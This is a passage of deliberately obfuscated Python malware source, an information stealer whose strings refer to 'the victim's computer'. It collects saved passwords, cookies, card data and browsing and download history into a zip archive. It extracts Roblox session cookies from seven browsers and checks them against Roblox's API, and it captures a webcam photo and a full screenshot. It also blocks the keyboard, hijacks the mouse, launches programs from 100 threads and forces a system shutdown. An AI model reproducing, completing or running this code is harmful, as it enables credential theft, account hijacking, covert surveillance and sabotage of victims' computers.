        MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW   = "\n".join(MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW)
    if "history" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        if not LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP:
            LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP.append("No history was saved on the victim's computer.")
        LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP   = "\n".join(LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP)
    if "downloads" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        if not NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI:
            NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI.append("No downloads was saved on the victim's computer.")
        NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI = "\n".join(NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI)
    if "cards" in OQPXKHAVSGYGAUBGFSLPWCNTUYJRLGKMLQDHYRFUFIJLWCGWAGTBSUUEFHZFLMXAVDXXCPGTPF:
        if not EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ:
            EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ.append("No cards was saved on the victim's computer.")
        EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ     = "\n".join(EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ)
    
    if FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD != None:
        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Passwords ({FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD}).txt", BWITGKALYLVOLFFDCXBOVLNELIKAPKXJPBBDGCVOHPTNVWDZRYZWEJSZCGRXMOVDBIPQPPVJQAISVDVPAT)

    if VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU != None:
        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Cookies ({VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU}).txt", MWYXHIGSGTMDTBWJLTYXXIUPVREOJNLXCYLIVDXTNPLMOZPSLYHKCAAHAMVAOAYBDW)

    if ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE != None:
        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Cards ({ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE}).txt", EBRVNEBOLAKCMXEWZBTPYZWKJVNEIXJDVROCMVUINNEUYAABIMPBTPHIAKWMVCYUTEQ)

    if UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS != None:
        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Browsing History ({UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS}).txt", LACHLPTKXTRWPDAKOXDBPKOELPDCFXBHKXWZUDTNOFCBHQFGKMXOSASSSZPFNZTMLSXAUAQQCZTTTLLQKP)

    if NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT != None:
        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Download History ({NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT}).txt",NXKWQTOBBMWMMBCCDTZICZSNGOTKGJAOHAXIQKZMJYABESVSTPRVGQZZHWDZJI)

    return DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX, FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD, VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU, UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS, NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT, ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE

def ZSVIRVMOLUKVAAEDMKIBGHXDNTNQCEBQKJHWKTPTWOKLKAYJOGUEVBHOUBWJLTC(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import browser_cookie3
    import requests
    import json

    OHIAGHAMTKVWHHDSFUPXVGHGZKTHFDJUVSJGNGOOURGPQGCLQJDLBTYQEMZJBGITIQIMUDZEXTIMWZORDTZXVFPEZCJTV = ""
    XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ = 0
    AUYFUIXZFZFGNVGTZXFUWMTCNZVKYUWUBPWACIOUISXHCTXIEQYRCOSESSBGAPEEQJXMEJPRPBROFSCFNFGLFOSMRWLURDV = []
    

    def DLQNKVPKPQCVMXJNNEJGVLLEDJVCOESXHLHHYXKBUVXXLPBCKFSNHDCVK(AYMBQOHYOPVYRZULEGUDMFLLNRYOADBGWKNOAOKOALQQUMFMQBMGYJZEMPITLYZBNHSRRRD):
        try:
            CXRARKTTQSPORDUSDTGNSNWDIBHYXNADYUDMJWVRPKRHPXGNRKLIWFNAWGEALI = AYMBQOHYOPVYRZULEGUDMFLLNRYOADBGWKNOAOKOALQQUMFMQBMGYJZEMPITLYZBNHSRRRD()
            CXRARKTTQSPORDUSDTGNSNWDIBHYXNADYUDMJWVRPKRHPXGNRKLIWFNAWGEALI = str(CXRARKTTQSPORDUSDTGNSNWDIBHYXNADYUDMJWVRPKRHPXGNRKLIWFNAWGEALI)
            GKJABPLTYOLMEFAYIQFCEUAFRMNRWFVFOXVEVHPFCKGBZRVOQHTGVJSPEYECQQHKJCQXNVWGZGWAFDDCVMRXVX = CXRARKTTQSPORDUSDTGNSNWDIBHYXNADYUDMJWVRPKRHPXGNRKLIWFNAWGEALI.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            TKETECJAQVDPIWGOFBDYKHUNCRERNPKJXPOQBEZXEKYFNRSIMMUYHYXSNIWABWLIHTBTBEBFJNNA = AYMBQOHYOPVYRZULEGUDMFLLNRYOADBGWKNOAOKOALQQUMFMQBMGYJZEMPITLYZBNHSRRRD.__name__
            return GKJABPLTYOLMEFAYIQFCEUAFRMNRWFVFOXVEVHPFCKGBZRVOQHTGVJSPEYECQQHKJCQXNVWGZGWAFDDCVMRXVX, TKETECJAQVDPIWGOFBDYKHUNCRERNPKJXPOQBEZXEKYFNRSIMMUYHYXSNIWABWLIHTBTBEBFJNNA
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    XTTYSDDJPRSSWCXVSQCJLBWTKGWXCQPBRWDDCZTRNQFDPSRWTVHCVPIANLWXXJJVLTXIBFZZAWQDX = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in XTTYSDDJPRSSWCXVSQCJLBWTKGWXCQPBRWDDCZTRNQFDPSRWTVHCVPIANLWXXJJVLTXIBFZZAWQDX:
        v4r_c00ki3, TKETECJAQVDPIWGOFBDYKHUNCRERNPKJXPOQBEZXEKYFNRSIMMUYHYXSNIWABWLIHTBTBEBFJNNA = DLQNKVPKPQCVMXJNNEJGVLLEDJVCOESXHLHHYXKBUVXXLPBCKFSNHDCVK(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in AUYFUIXZFZFGNVGTZXFUWMTCNZVKYUWUBPWACIOUISXHCTXIEQYRCOSESSBGAPEEQJXMEJPRPBROFSCFNFGLFOSMRWLURDV:
                XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ += 1
                AUYFUIXZFZFGNVGTZXFUWMTCNZVKYUWUBPWACIOUISXHCTXIEQYRCOSESSBGAPEEQJXMEJPRPBROFSCFNFGLFOSMRWLURDV.append(v4r_c00ki3)
                try:
                    NWBEPFLVTTQBEIOTNASUUHPLBQRLNNLIYNNOOHIRCWVYTGCRDRWFBM = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT = json.loads(NWBEPFLVTTQBEIOTNASUUHPLBQRLNNLIYNNOOHIRCWVYTGCRDRWFBM.text)
                except:
                    IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT = {"None": "None"}

                JBFMHYAZQOFOTOARZDEUEAMNEWQLTCEJMATWQCTPFLFXTCASGXZSPOKQNHBHOHKCUQEBVULAFBSCLZTWZCZVODEIM = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('id', "None")
                YVKKHIUYGMMCCEXCONDYYIOPKSBNXWQLCBNSGBBZUMVKAMOFYGXHGX = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('displayName', "None")
                ENESDERRZYUSURMNMSJJNNOVAQZDFWAIAVYKDFVNPDAHVCPKYZJDPNDTFOWRRW = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('name', "None")
                MULEPJMFLFROENHWQSSDMKKBKXQQGGFQAPZVMHLRGYAKFUGMLYPMDSDXFFDXRXBPTBFUSITFHBVRSXTWITVFINLDHIJPGRUHZ = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get("RobuxBalance", "None")
                XSSYRQYEGRNMTNKRMHHRQMFECKAQOFNWWLNZFFUHJMYMAGCUUR = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get("IsPremium", "None")
                YXGPSPHZBAHOCPDDDJQTBRZBOAIOZFFDESEHTYZORQFXRANCLIHTQMALH = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get("ThumbnailUrl", "None")
                NAUUPDSWIGAPKVTNTMOGDFZHHBMDOJBSDTGZOTTMJBLIFLAUHFUCEZMCSDQKWATVZKG = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get("IsAnyBuildersClubMember", "None")
                
                OHIAGHAMTKVWHHDSFUPXVGHGZKTHFDJUVSJGNGOOURGPQGCLQJDLBTYQEMZJBGITIQIMUDZEXTIMWZORDTZXVFPEZCJTV = OHIAGHAMTKVWHHDSFUPXVGHGZKTHFDJUVSJGNGOOURGPQGCLQJDLBTYQEMZJBGITIQIMUDZEXTIMWZORDTZXVFPEZCJTV + f"""
Roblox Account n°{str(XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ)}:
 - Navigator     : {TKETECJAQVDPIWGOFBDYKHUNCRERNPKJXPOQBEZXEKYFNRSIMMUYHYXSNIWABWLIHTBTBEBFJNNA}
 - Username      : {ENESDERRZYUSURMNMSJJNNOVAQZDFWAIAVYKDFVNPDAHVCPKYZJDPNDTFOWRRW}
 - DisplayName   : {YVKKHIUYGMMCCEXCONDYYIOPKSBNXWQLCBNSGBBZUMVKAMOFYGXHGX}
 - Id            : {JBFMHYAZQOFOTOARZDEUEAMNEWQLTCEJMATWQCTPFLFXTCASGXZSPOKQNHBHOHKCUQEBVULAFBSCLZTWZCZVODEIM}
 - Avatar        : {YXGPSPHZBAHOCPDDDJQTBRZBOAIOZFFDESEHTYZORQFXRANCLIHTQMALH}
 - Robux         : {MULEPJMFLFROENHWQSSDMKKBKXQQGGFQAPZVMHLRGYAKFUGMLYPMDSDXFFDXRXBPTBFUSITFHBVRSXTWITVFINLDHIJPGRUHZ}
 - Premium       : {XSSYRQYEGRNMTNKRMHHRQMFECKAQOFNWWLNZFFUHJMYMAGCUUR}
 - Builders Club : {NAUUPDSWIGAPKVTNTMOGDFZHHBMDOJBSDTGZOTTMJBLIFLAUHFUCEZMCSDQKWATVZKG}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not AUYFUIXZFZFGNVGTZXFUWMTCNZVKYUWUBPWACIOUISXHCTXIEQYRCOSESSBGAPEEQJXMEJPRPBROFSCFNFGLFOSMRWLURDV:
        OHIAGHAMTKVWHHDSFUPXVGHGZKTHFDJUVSJGNGOOURGPQGCLQJDLBTYQEMZJBGITIQIMUDZEXTIMWZORDTZXVFPEZCJTV = "No roblox cookie found."
        
    DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr(f"Roblox Accounts ({XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ}).txt", OHIAGHAMTKVWHHDSFUPXVGHGZKTHFDJUVSJGNGOOURGPQGCLQJDLBTYQEMZJBGITIQIMUDZEXTIMWZORDTZXVFPEZCJTV)

    return XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ

def CWVXPOPHTQOVFZPFJTDIJYCYLNOVKXMAISAPKFSESKYQLBGBIZLMWIMVJXPVLBAFOTRWDKKZS(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    import cv2
    import io
    from PIL import Image

    try:
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = "Yes"
        OMWCRAFPBVFKZRLVDANAMCRKEXRHCSBRKPEXHDXWVFEPDBQFANMIVJDUVMAD = cv2.VideoCapture(0)

        if not OMWCRAFPBVFKZRLVDANAMCRKEXRHCSBRKPEXHDXWVFEPDBQFANMIVJDUVMAD.isOpened():
            AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = "No webcam found."
            return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture

        v4r_ret, v4r_frame = OMWCRAFPBVFKZRLVDANAMCRKEXRHCSBRKPEXHDXWVFEPDBQFANMIVJDUVMAD.read()
        OMWCRAFPBVFKZRLVDANAMCRKEXRHCSBRKPEXHDXWVFEPDBQFANMIVJDUVMAD.release()

        if not v4r_ret:
            AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = "Failed to capture image."
            BHAEIRMAVOXTVJBBVOFCWAUFAUYTVPAMIHWAGRGWLTSVOVJQCKSAVXRECGJLVQWQEBLHDQCDIROQFXBHLJLM()
            return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture

        FMLGFLGEBEWCPGBCKUXWUCUHHYSKVFSTDDIPINPEPDGDEXHHFFLELJYQGQGHBWAJDHFJ = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        CJCZITVXBPMNZXUYYWAEDTDZBIRASSGMLTJEDZWFTBSXDSDDKGPTIXVMDJFBQKQOIZAXXXQNDMQNEIFZD = Image.fromarray(FMLGFLGEBEWCPGBCKUXWUCUHHYSKVFSTDDIPINPEPDGDEXHHFFLELJYQGQGHBWAJDHFJ)
        WXXZBPSWEFQNIQLMMNENGHKSXIFQEUQKGRREYSRIZWMJHOSRXHGLXXIWOJBJPPIOCC = io.BytesIO()
        CJCZITVXBPMNZXUYYWAEDTDZBIRASSGMLTJEDZWFTBSXDSDDKGPTIXVMDJFBQKQOIZAXXXQNDMQNEIFZD.save(WXXZBPSWEFQNIQLMMNENGHKSXIFQEUQKGRREYSRIZWMJHOSRXHGLXXIWOJBJPPIOCC, format='PNG')
        WXXZBPSWEFQNIQLMMNENGHKSXIFQEUQKGRREYSRIZWMJHOSRXHGLXXIWOJBJPPIOCC.seek(0)
        DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM.writestr("Webcam.png", WXXZBPSWEFQNIQLMMNENGHKSXIFQEUQKGRREYSRIZWMJHOSRXHGLXXIWOJBJPPIOCC.read())

        return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture

    except Exception as e:
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = f"Error: {e}"
        return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture

def ULHLKLXIYVMSLQBLRLWBVLMTVMNIKHMZBDWOWUIIHFOOXXWMLVBXWOUMZAVFLJUCKWQTMTHWBAL(zip_file):
    import io
    from PIL import ImageGrab

    try:
        HXQWGTFKQZMMTZKVFGVRSTNCJWHNSINQPDEVKDSHOPRFNRAPOLKWCYVNNVOVUWVYZTJXYZGKRQMRNMYYCIFIC = "Yes"

        def C4ptur3():
            AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ_bytes = io.BytesIO()
            AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ.save(AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ_bytes, format='PNG')
            AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ_bytes.seek(0)
            return AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ_bytes

        AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", AUUJETVOHTMNGNBATONMFSXJGQZWDTXZWINTOUBALTPPUZTPYILNZRULFRLOWUSBYCTPAJ_bytes.read())
        return HXQWGTFKQZMMTZKVFGVRSTNCJWHNSINQPDEVKDSHOPRFNRAPOLKWCYVNNVOVUWVYZTJXYZGKRQMRNMYYCIFIC
    except Exception as e:
        HXQWGTFKQZMMTZKVFGVRSTNCJWHNSINQPDEVKDSHOPRFNRAPOLKWCYVNNVOVUWVYZTJXYZGKRQMRNMYYCIFIC = f"Error: {e}"
        return HXQWGTFKQZMMTZKVFGVRSTNCJWHNSINQPDEVKDSHOPRFNRAPOLKWCYVNNVOVUWVYZTJXYZGKRQMRNMYYCIFIC

def JLWDIBNUTQNKBDYSSMYFWUYUZZCEXESGIVTTJNKTQPAJRXHCTPOJJQWMASAUMSVOCQAFTNOWHQCWOUNVLY():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def LTMPRYLGQBHHNALWUFNNSTIWXBHCHTQBPRDUBFIYWMTJMXBYIHCYFATANGUDRZ():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def QPTHPNMNEDHBBVLZZYIRIDWHGVOQVHGBVRFQCTPWDZYHIWMVEVKLHNUPNWFIFJNXFUNVKD():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def IHEPZTTPQIBZOTCUMTLTUZZRWSPFXXZHDZVGVHANITPZRPSLKLZGL():
    import subprocess
    import threading

    def TXUAFUCUOMTKGVVQYQYPVOYDZLOFTNNTCJSNEPLOFLUXYBYKOTGYKKSMUXPZTXHNNMQTT():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def AYGARCOEAJNALJPJTXTTAIBTEUUMMUZPLFFEEHIBQKODNJBWEREBQQOWYDEDXOBDXMLEEKRSCZRWAADVQOUD():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=TXUAFUCUOMTKGVVQYQYPVOYDZLOFTNNTCJSNEPLOFLUXYBYKOTGYKKSMUXPZTXHNNMQTT)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    AYGARCOEAJNALJPJTXTTAIBTEUUMMUZPLFFEEHIBQKODNJBWEREBQQOWYDEDXOBDXMLEEKRSCZRWAADVQOUD()

def MTCGVPZMQQQYKBLPASOYAGDJJAVLHIVGWMFNBFURIWAZNTTJXEGWHZMK():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

def TXUAFUCUOMTKGVVQYQYPVOYDZLOFTNNTCJSNEPLOFLUXYBYKOTGYKKSMUXPZTXHNNMQTTOpti0ns():
    import keyboard
    while True:
        try:
            QPTHPNMNEDHBBVLZZYIRIDWHGVOQVHGBVRFQCTPWDZYHIWMVEVKLHNUPNWFIFJNXFUNVKD()
            IHEPZTTPQIBZOTCUMTLTUZZRWSPFXXZHDZVGVHANITPZRPSLKLZGL()
            UDCQWQXPWQVYNOUOTQKJOTIRWEQOXFSULGMDBVJEYGOZIYTIOKBZDHRPPHNDXTISRZNKHNLNJCCMIQKZIKCGAZKZZZKSSXIAE()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

TBHKPLHOKSGYLQELNCVPUBTXKDUZZMNGLLOEKUDAUWLQIEARATPQVOVJVBIOIDEUZIOEEOWRZYNBPTHJBJNDXTSFLP = []

BZDALHZNWGUPXKVJIXCZFCSANOOSLRGWUEJYXWJWQPMBCBDTUELBFMHGCLFJQAQBMAPNHLSRNKFTSSMJLKFJ = io.BytesIO()
with zipfile.ZipFile(BZDALHZNWGUPXKVJIXCZFCSANOOSLRGWUEJYXWJWQPMBCBDTUELBFMHGCLFJQAQBMAPNHLSRNKFTSSMJLKFJ, "w", zipfile.ZIP_DEFLATED) as DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM:

    try: 
        PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN = JKDOWBOKGFDIJQUFSCUAAEMBMTVYPWJVRDBBDZOZUPDRTCCIWOH()
    except Exception as e:
        PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN = f"Error: {e}"

    try: 
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info = LPFGWRANZIRLPPONGQTBTSKOBXESXLUBFQSNJSPIMKVRKEXQBBPEMZKCRZCZMKSKBFMZMSLWYPNMZOXPD(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM)
    except Exception as e:
